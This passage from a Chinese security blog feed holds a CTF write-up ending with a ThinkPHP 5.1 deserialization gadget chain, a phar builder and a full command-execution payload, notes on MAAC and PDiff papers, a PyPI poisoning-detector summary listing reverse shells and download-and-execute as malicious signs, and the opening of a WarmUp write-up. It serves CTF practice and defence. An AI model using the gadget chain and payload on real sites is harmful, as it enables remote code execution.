class="keyword">protected</span> <span class="variable">$config</span> = [</span><br><span class="line">        <span class="comment">// 表单请求类型伪装变量</span></span><br><span class="line">        <span class="string">&#x27;var_method&#x27;</span>       =&gt; <span class="string">&#x27;_method&#x27;</span>,</span><br><span class="line">        <span class="comment">// 表单ajax伪装变量</span></span><br><span class="line">        <span class="string">&#x27;var_ajax&#x27;</span>         =&gt; <span class="string">&#x27;_ajax&#x27;</span>,</span><br><span class="line">        <span class="comment">// 表单pjax伪装变量</span></span><br><span class="line">        <span class="string">&#x27;var_pjax&#x27;</span>         =&gt; <span class="string">&#x27;_pjax&#x27;</span>,</span><br><span class="line">        <span class="comment">// PATHINFO变量名 用于兼容模式</span></span><br><span class="line">        <span class="string">&#x27;var_pathinfo&#x27;</span>     =&gt; <span class="string">&#x27;s&#x27;</span>,</span><br><span class="line">        <span class="comment">// 兼容PATH_INFO获取</span></span><br><span class="line">        <span class="string">&#x27;pathinfo_fetch&#x27;</span>   =&gt; [<span class="string">&#x27;ORIG_PATH_INFO&#x27;</span>, <span class="string">&#x27;REDIRECT_PATH_INFO&#x27;</span>, <span class="string">&#x27;REDIRECT_URL&#x27;</span>],</span><br><span class="line">        <span class="comment">// 默认全局过滤方法 用逗号分隔多个</span></span><br><span class="line">        <span class="string">&#x27;default_filter&#x27;</span>   =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="comment">// 域名根，如thinkphp.cn</span></span><br><span class="line">        <span class="string">&#x27;url_domain_root&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="comment">// HTTPS代理标识</span></span><br><span class="line">        <span class="string">&#x27;https_agent_name&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="comment">// IP代理获取标识</span></span><br><span class="line">        <span class="string">&#x27;http_agent_ip&#x27;</span>    =&gt; <span class="string">&#x27;HTTP_X_REAL_IP&#x27;</span>,</span><br><span class="line">        <span class="comment">// URL伪静态后缀</span></span><br><span class="line">        <span class="string">&#x27;url_html_suffix&#x27;</span>  =&gt; <span class="string">&#x27;html&#x27;</span>,</span><br><span class="line">    ];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filter = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;config = [<span class="string">&quot;var_ajax&quot;</span>=&gt;<span class="string">&#x27;&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;hook = [<span class="string">&quot;visible&quot;</span>=&gt;[<span class="keyword">$this</span>,<span class="string">&quot;isAjax&quot;</span>]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files=[<span class="keyword">new</span> Pivot()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="variable">$win</span> = <span class="keyword">new</span> Windows();</span><br><span class="line"><span class="comment">//echo base64_encode(serialize(new Windows()));</span></span><br><span class="line"><span class="comment">//id=whoami</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>phar.phar</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;tp5137.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">@unlink(<span class="string">&#x27;phar.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&#x27;phar.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$o</span> = <span class="variable">$win</span>;</span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 两次urlencode是base64中+和=的关系，由于代码里有parse_str和extract，这样才能正常赋值</span></span><br><span class="line"><span class="keyword">echo</span> urlencode(urlencode(file_get_contents(<span class="string">&quot;phar.phar&quot;</span>)));</span><br></pre></td></tr></table></figure><p>paylod:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?s=index/index/hello&amp;id=cat%20/y0u_f0und_It</span><br><span class="line"></span><br><span class="line">POST</span><br><span class="line">world=hello=PD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8%252BDQrBAQAAAQAAABEAAAABAAAAAACLAQAATzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czo1OiJldGhhbiI7YToyOntpOjA7czozOiJkaXIiO2k6MTtzOjQ6ImNhbGMiO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo1OiJldGhhbiI7TzoxMzoidGhpbmtcUmVxdWVzdCI6Mzp7czo3OiIAKgBob29rIjthOjE6e3M6NzoidmlzaWJsZSI7YToyOntpOjA7cjo5O2k6MTtzOjY6ImlzQWpheCI7fX1zOjk6IgAqAGZpbHRlciI7czo2OiJzeXN0ZW0iO3M6OToiACoAY29uZmlnIjthOjE6e3M6ODoidmFyX2FqYXgiO3M6MDoiIjt9fX19fX0IAAAAdGVzdC50eHQEAAAAqsahYQQAAAAMfn%252FYpAEAAAAAAAB0ZXN0tBgBQ8v5C13sBL%252Fyl3ck2XQg5WACAAAAR0JNQg%253D%253D%26a=phar://hello.txt</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF WriteUp </category>
          
          <category> Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PR - MAAC: Novel Alert Correlation Method To Detect Multi-step Attack</title>
      <link href="/2021/11/03/MAAC%20-%20Novel%20Alert%20Correlation%20Method%20To%20Detect%20Multi-step%20Attack/"/>
      <url>/2021/11/03/MAAC%20-%20Novel%20Alert%20Correlation%20Method%20To%20Detect%20Multi-step%20Attack/</url>
      
        <content type="html"><![CDATA[<blockquote><p><em>原文作者：X Wang, L Yu, H He, X Gong</em></p><p><em>原文标题：MAAC: Novel Alert Correlation Method To Detect Multi-step Attack</em></p><p><em>原文链接：<a href="https://arxiv.org/pdf/2011.07793.pdf">https://arxiv.org/pdf/2011.07793.pdf</a></em></p><p><em>原文来源：TrustCom 2021</em></p><p><em>笔记作者：outx</em></p></blockquote><h2 id="0x01-Intro"><a href="#0x01-Intro" class="headerlink" title="0x01 Intro"></a>0x01 Intro</h2><p>首先需要了解的是，随着攻击手段及攻击机制的改进，现在的攻击者往往会考虑利用分布式攻击的方式来进攻。最为直观的便是高级网络攻击会包含多个攻击阶段来实现最终目标。而传统的入侵检测系统，例如IDS、防火墙等等用于监视网络情况的工具会在被攻击期间产生大量告警。虽然这些告警中包含了关联攻击者的攻击线索，但大部分的告警是与攻击无关的误报。对于网络管理人员来说，手动在大量异构的告警中排查梳理出攻击者的攻击阶段和路线犹如大海捞针。</p><p>作者提出并实现了MAAC，一个多阶段攻击告警关联分析系统，它能够有效地减少重复的告警，并根据告警的语义和攻击阶段来组合生成可疑的多阶段攻击路径。本文主要解决了一个问题，即如何了解告警的语义，并通过语义进行聚合和关联，最终得到可疑主机和攻击路径的顺序。这个问题主要有三个方面：</p><ol><li>告警语义：实现的算法应该能够理解告警的含义，并通过告警语义分析获得攻击所属阶段</li><li>攻击关联性：这部分的挑战在于通过逻辑语义自动关联告警，而非是通过特征或者手动关联</li><li>攻击路径发现：作者的目标是建立一个攻击告警图并提供可能存在的攻击路径，同时对疑似沦陷的主机进行排序</li></ol><h2 id="0x02-Method"><a href="#0x02-Method" class="headerlink" title="0x02 Method"></a>0x02 Method</h2><p>作者构建了一个威胁模型用于研究，如下图<br><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/3bd36641-0adb-486f-a58c-263e1041504e.png"><br>攻击者首先尝试攻击办公网中的两台主机，通过钓鱼邮件的方式或其他方法，如CVE-2017011882，但仅成功一台。随后，攻击者在这台电脑上安装后门，并开始尝试横向移动，其通过这台受控主机进行内网扫描，尝试利用MS17-010等漏洞直接控制内网其他主机，这时又仅有一台成功，这台主机与核心服务器相连，攻击者便能够从核心服务中获取敏感信息。</p><p>在整个入侵过程中，边界和内部网络入侵检测系统会分别产生大量的告警，除此之外还有大量由主机端安装的安全软件产生的关于恶意文件和后门的告警。这些告警是混乱，且大量重复的。不论是告警的分散性还是重复性都严重阻碍了网络管理人员的排查，增加了攻击检测的难度，所以作者聚焦于如何处理告警而不是如何生成告警。以下是MAAC的架构，总结起来主要是五部分：</p><ol><li>告警解析：规范化不同安全设备和软件生成的告警，解析成标准化告警</li><li>告警信息向量化：主要是为了尽可能减少重复的告警的数量，去掉无意义的干扰项</li><li>告警关联分析：在精简了留存了有效告警之后，MAAC将告警关联起来生成告警图，包括同一主机上的告警关联和不同主机之间告警的关联</li><li>图遍历：在生成告警图之后，MAAC会遍历该图查找具有三个及以上的所有路径</li><li>攻击路径排名：作者提出了用于计算路径概率的方程，以获得最可能的攻击路径</li></ol><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/ad2cab44-59b5-43de-9f16-adacc4e13fcd.png"></p><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>在本文中，作者提出并实现了MAAC，这是一种基于语义分析的告警缩减和告警关联技术，以解决网络中安全设备告警数量爆炸导致网络管理人员无法及时有效地排除攻击者威胁的情况。同时，MAAC能够给出可能的攻击路径及其可疑程度，进一步协助攻击检测，它并不需要先验知识，完全由告警之间的关联生成。</p><p>读者在读完这篇文章后主要有两个疑问：一是数据集的问题，作者在Real-World Evaluation部分中描述了其用于评估的数据集，但这存在一个问题，这些数据集偏旧了，近几年安全设备的迭代相较于10年初可谓是日新月异，现有的安全设备的告警相较于作者使用的数据集中的有效性应该会高很多，在这种情况下MAAC的关联分析会不会更加精准一些呢？二是路径发现问题，仅仅只是找三个节点及以上的路径是如何确定的呢，短路径，即一两步的攻击路径为何不考虑呢？也许攻击者直接一封邮件邮到网络管理员那里，恰好网络管理员又在域控呢？不过总的来说，这篇文章站在一个新的角度对内网攻击，尤其是这种多阶段的攻击检测提出了一个特别好的检测思路。</p>]]></content>
      
      
      <categories>
          
          <category> Paper Reading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TrustCom 2021 </tag>
            
            <tag> Attack Detection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PR - PDiff: Semantic-based Patch Presence Testing for Downstream Kernels</title>
      <link href="/2021/10/27/PDiff%20-%20Semantic-based%20Patch%20Presence%20Testing%20for%20Downstream%20Kernels/"/>
      <url>/2021/10/27/PDiff%20-%20Semantic-based%20Patch%20Presence%20Testing%20for%20Downstream%20Kernels/</url>
      
        <content type="html"><![CDATA[<blockquote><p><em>原文作者：Z Jiang, Y Zhang, J Xu, Q Wen, Z Wang</em></p><p><em>原文标题：PDiff: Semantic-based Patch Presence Testing for Downstream Kernels</em></p><p><em>原文链接：<a href="https://secsys.fudan.edu.cn/_upload/article/files/69/06/2b05ab0d4f8bba54fd410b031ae8/7024cbe1-82e7-4308-876a-4c8973eb809a.pdf">https://secsys.fudan.edu.cn/_upload/article/files/69/06/2b05ab0d4f8bba54fd410b031ae8/7024cbe1-82e7-4308-876a-4c8973eb809a.pdf</a></em></p><p><em>原文来源：CCS 2020</em></p><p><em>笔记作者：outx</em></p></blockquote><h2 id="0x01-Intro"><a href="#0x01-Intro" class="headerlink" title="0x01 Intro"></a>0x01 Intro</h2><p>首先需要了解的背景是，开源内核通常会被一些下游厂商应用在数十亿的设备上，但这些下游厂商经常遗漏或推迟其主流版本中的补丁发布，更糟糕的是有些厂商甚至不公开补丁的发布进展，这就导致了其设备的安全性不能够得到及时的保障，危害其用户的安全。所以对于那些常常受到安全威胁的群体来说，打补丁的情况至关重要，这就要求我们对下游厂商所发布的设备的内核中补丁的存在性进行测试。</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/50cb4bec-f9e3-468f-a019-4edda4aafc9e.png"></p><p>现有的检测方式主要是通过代码签名匹配来判断目标内核中是否有补丁，但这对于实际情况来说是远远不足的。这主要是因为下游厂商通常是客制化的代码风格，这通常会改变主流版本的补丁代码以适配其自身的代码情况，使得校验失败。作者提出了PDiff，首先生成与目标补丁相关的语义摘要，然后基于这个语义摘要，PDiff会将目标内核与采用补丁前后的主流版本进行比较（选择更接近的参考版本来确定补丁的状态）。</p><p>而补丁存在性测试的主要挑战来自于主流版本和下游内核之间的代码层差异，详细来说：</p><ul><li>第三方代码定制：开源内核往往会被第三方供应商客制化，以拓展其功能点。</li><li>非标准Building配置：现代操作系统内核往往带有其Building配置，以适应功能的需要</li></ul><p>以上这两种情况是十分普遍存在的，而且会在很大程度上影响补丁存在性的测试，仍然是很难处理好的点。</p><h2 id="Method"><a href="#Method" class="headerlink" title="Method"></a>Method</h2><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/b3f7a370-6b98-4979-9ba6-d13ebb6fc3e6.png"></p><p>PDiff设计的基本原理是，目标内核和它的参考版本不论在代码层面如何改变，它们应该具有类似的语义，具体的工作流程如下图所示，简单来说分为：</p><ol><li>锚块选择：PDiff从受补丁影响的路径总结补丁语义，所以需要确定好锚块，主要是从参考版本中找到与补丁相关的函数，然后引入锚块这个定义，锚块的属性有：<ul><li>任何穿过受补丁影响的代码块的路径都会到达至少一个锚块。通过这种方式，能够保证所有受补丁影响的代码块都被覆盖。</li><li>在锚块之后的任何路径都不能到达受补丁影响的代码块。这就保证了没有受补丁影响的代码块会被截取掉。</li><li>在存在补丁之前的版本中，一个锚块应该在打了补丁后的版本中有对应的部分，反之亦然。</li></ul></li><li>补丁摘要生成：给定补丁相关函数中的锚块，PDiff将枚举函数开始到锚块结束的路径，这个路径将被认定为受到补丁影响的路径，然后根据路径摘要获取补丁摘要。</li><li>基于摘要的补丁存在测试：在获得两个参考版本和目标内核的补丁摘要后，我们衡量它们的相似性以确定补丁状态。</li></ol><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>本文主要深入研究了下游厂商设备中内核补丁的存在性测试方法，它主要克服了补丁存在性检测的两个关键挑战：第三方代码定制和非标准Building配置。读者在读完这篇paper后主要有两个问题：一是对于受影响代码块起始部分的判定，如果说该函数存在着父子函数关系时，应该如何取舍，究竟是扩大锚块呢还是精确缩小呢？二是选择的前后两个主流版本的问题，如何在没有对下游内核中补丁存在性做出判断依据前，精准定位到前后最近的两个主流版本？这其中的资源消耗，数据集体量又是如何？</p>]]></content>
      
      
      <categories>
          
          <category> Paper Reading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux Kernel </tag>
            
            <tag> Semantic Analysis </tag>
            
            <tag> CCS 2020 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Conference - TrustCom</title>
      <link href="/2021/10/25/Trustcom2021/"/>
      <url>/2021/10/25/Trustcom2021/</url>
      
        <content type="html"><![CDATA[<blockquote><p><em>会议名称：International Conference on Trust, Security and Privacy in Computing and Communications</em></p><p><em>笔记作者：outx</em></p></blockquote><h2 id="0x01-心得体会"><a href="#0x01-心得体会" class="headerlink" title="0x01 心得体会"></a>0x01 心得体会</h2><p>这是第一次参加这种需要用全英文做汇报的会议，包括了对自己论文的介绍和现场听众的答疑。</p><p>对于自己论文的介绍这一部分来说，全英文汇报的难度并不大，首先是因为在写论文的时候大量的内容或者说这篇论文中涉及到的大部分英语词汇和短语都已经很熟悉，通过短期的朗读和背诵是能够达到铭记于心的效果的；其次就是在讲演时通常会有演讲者视图，如若没有也可以准备提词本，以达到良好的讲演效果。</p><p>对于现场听众的答疑这一部分来说，由于现场听众的英语水平不同（国人还是外国人）、听力/理解能力不同、对同一个事情的看法观点不同，提出的问题不尽相同。这就会出现哪怕提前准备了一些问题但是还是会被问到没有准备的地方，这个时候由于本身不是长期生活在英语交流的环境中，灵活的运用英语进行问答交流是一件特别困难的事。但这个情况也有应对之法，首先提前准备问题是很有必要的一件事，不论听众如何提问，可以适当的将其问题引至自己准备过的问题上，如果实在没有准备这方面的答案，可以适当的解释目前这个方面所做的工作，再表明在以后的实验中会加入相关考虑，最后表示对这个问题的感谢。</p><h2 id="0x02-Malicious-Packages-Lurking-in-User-Friendly-Python-Package-Index"><a href="#0x02-Malicious-Packages-Lurking-in-User-Friendly-Python-Package-Index" class="headerlink" title="0x02 Malicious Packages Lurking in User-Friendly Python Package Index"></a>0x02 Malicious Packages Lurking in User-Friendly Python Package Index</h2><p>本文主要是针对目前PyPI（所有Python组件包的索引）生态现状的一次调研，研究了针对pip安装工具的投毒攻击，这是一类供应链攻击问题，涉及开源软件库安全。</p><h3 id="0x021-Intro"><a href="#0x021-Intro" class="headerlink" title="0x021 Intro"></a>0x021 Intro</h3><p>Python由于其在人工智能领域的火热，已经逐渐成为了世界第三受欢迎的开发语言。这很大程度上归功于开源组件索引PyPI及其安装工具PIP。但在我们探究PIP安装过程中，我们发现有许多攻击人员针对PIP这一安装过程展开了攻击。我们针对目前所有的独立检测方案进行了分析，找出了其各自的一些短板，最终打算将异常检测这一概念引入至PIP投毒攻击检测这一领域，设计并实现了一个用于检测PIP投毒的工具，PPD(pip poisoning detection)。</p><h3 id="0x022-Method"><a href="#0x022-Method" class="headerlink" title="0x022 Method"></a>0x022 Method</h3><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20211025101137448.png" alt="image-20211025101137448"></p><p>上图是整个PPD的结构图，主要分为三个部分：数据预处理，特征提取，模型训练及结果输出</p><p><strong>数据预处理</strong></p><p>所有实验用到的组件包均是从PyPI及其镜像站中下载的，在这部分流程中，我们主要是创新性提出了入口文件这个概念，并根据PIP的安装流程设计了一套用于提取入口文件的方案。具体来说，针对tar.gz的安装包，我们提取其setup.py，针对whl/zip的安装包，我们提取其__init__.py或是以组件包名字命名的py文件。当获取到了这个入口文件之后，我们将利用AST对其进行解析，获取Import节点和ImportFrom节点，这两个节点中包含有所有需要引入的额外文件。我们会遍历整个安装包，以找到那些存在于包内但又被入口文件所调用的py文件，然后合并以形成完整的安装时运行代码。</p><p><strong>特征提取</strong></p><p>我们将所有特征分为代码特征和组件包特征。</p><p>对于代码特征来说，我们主要设置了11种场景特征，包括代码执行、外连请求、目录遍历、文件操作、敏感文件读取、压缩与解压缩、引入其他文件、最长字符串、编码与解码、IP/URL、entry_points内容。我们首先会利用AST去解析整个代码，但是会存在AST解析不成功的情况，这时候便利用正则来处理，具体的可以阅读论文。</p><p>对于组件包特征来说，在前期的实验中我们加入了例如版本号，发布时间，作者人数等诸多维度的特征，但在实验结果中反馈并不好，于是我们最终选择了能够快速检测针对开发人员误拼写（最常见的一种攻击手段）的特征，即组件包名称的编辑距离</p><p><strong>模型检测及结果输出</strong></p><p>在选取模型的时候，我们主要需要解决三个问题：</p><ol><li>特征维度较高时，需要一个很大数据集：由于PyPI体量很大并且在不断增长，我们是能够构建一个很大的数据集的</li><li>一些低密度区的样本容易被认定为异常样本：我们分析了所有代码长度小于100的组件包，分析其代码长度分布情况，最后我们发现长度小于等于10的组件包占了43%，这一些组件包我们可以很容易一眼看出其性质</li><li>预定义的样本分布情况会严重影响到模型输出：我们选择了孤立森林模型，主要是因为其利用切割的方式来分割样本而非通过描述正常样本来区分异常。</li></ol><p>在做模型训练时，由于我们无法保证在训练样本中是否会混杂恶意样本，因此我们采用反向交叉验证的训练方式，以此来尽可能减轻由于错误引入恶意样本至训练样本中所引起的误差。同时，由于训练样本的减少，我们考虑分别使用3、5、10折反向交叉验证后去重输出的方式，尽可能保证输出可能性最大的异常样本集合。</p><p>在人工审查阶段，我们通过分析几十个以往披露的恶意python组件包，初步制定了一套用于判断组件包行为的规则，具体来说，</p><p>应当被认定是可疑组件包的行为包括：</p><ul><li>执行外部文件（.sh or .exe）</li><li>包含编码后的字符串</li><li>下载远程资源并解压</li><li>读取文件并且执行</li><li>修改系统配置文件或私自打开服务</li></ul><p>应当被认定是恶意组件包的行为包括：</p><ul><li>下载远程文件并且执行</li><li>创建反弹shell</li><li>盗取敏感数据</li><li>解码后执行</li><li>明显的恶意代码或后门</li></ul><h3 id="0x023-Conclusion"><a href="#0x023-Conclusion" class="headerlink" title="0x023 Conclusion"></a>0x023 Conclusion</h3><p>简单来说，我们所做的工作主要是想要减轻针对整个PyPI生态进行检查的时候的工作量，目的在于发现那些在野的恶意组件包以说明此项工作的必要性，但这也存在着一些局限性，例如针对那些在安装的时候不触发，而在代码中import的时候触发的恶意组件包PPD并没有很好的检测效果，亦或是针对那一类功能单一但的确包含恶意代码的组件包我们的方案也暂时无能为力。</p><p>在未来的工作中，我们会总结并处理这一些细节上的东西，以进一步优化和提高我们的方案命中率。</p><h2 id="0x03-一些想法"><a href="#0x03-一些想法" class="headerlink" title="0x03 一些想法"></a>0x03 一些想法</h2><p>对于上台讲演这种事，还是需要很大的勇气的，尤其是这种需要脱离母语环境的讲演。这次会议还好是在国内，国人居多，老外也都是一些留学生，所以鄙人也没有特别紧张。但这并不意味着，做好讲演准备、上台做汇报、与听众交流讨论是一件易事，相反，这是一件费时费力且效果不明显的事。直到现在，鄙人的英语交流能力也不太行，中文语言逻辑和英文语言逻辑的区别还是太大了，需要后面多多练习才可。</p><p>同时，第一次学着做这种学术汇报PPT也踩了很多坑，不能全是图也不能全是文字，一页PPT不能太空也不能太拥挤，需要合理的布局，但是我特别喜欢我做的首页，在这次会议中看了一圈也没有比这个更符合我审美的了，嘻嘻嘻😁</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20211025144127089.png" alt="image-20211025144127089"></p><p>下次再接再厉，认真学习！</p>]]></content>
      
      
      <categories>
          
          <category> Conference </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TrustCom 2021 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WP - Buuctf Web Part</title>
      <link href="/2021/09/29/Buuctf%20Web%20Part/"/>
      <url>/2021/09/29/Buuctf%20Web%20Part/</url>
      
        <content type="html"><![CDATA[<blockquote><p><em>练习平台Buuctf</em></p><p><em>持续更新直到Web部分结束</em></p><p><em>笔记作者：outx</em></p><p><em>最后一次更新于2021-09-29</em></p></blockquote><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>]; <span class="comment">//白名单跟后续函数配合使用</span></span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !is_string(<span class="variable">$page</span>)) &#123; <span class="comment">//确定是否是字符串</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;<span class="comment">//提交的参数中是否在白名单</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = mb_substr( <span class="comment">//过滤问号</span></span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123; <span class="comment">//再次验证白名单</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);  <span class="comment">//将提交的参数进行url解码</span></span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(  <span class="comment">//过滤问号</span></span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123; <span class="comment">//再次验证白名单</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; is_string(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span 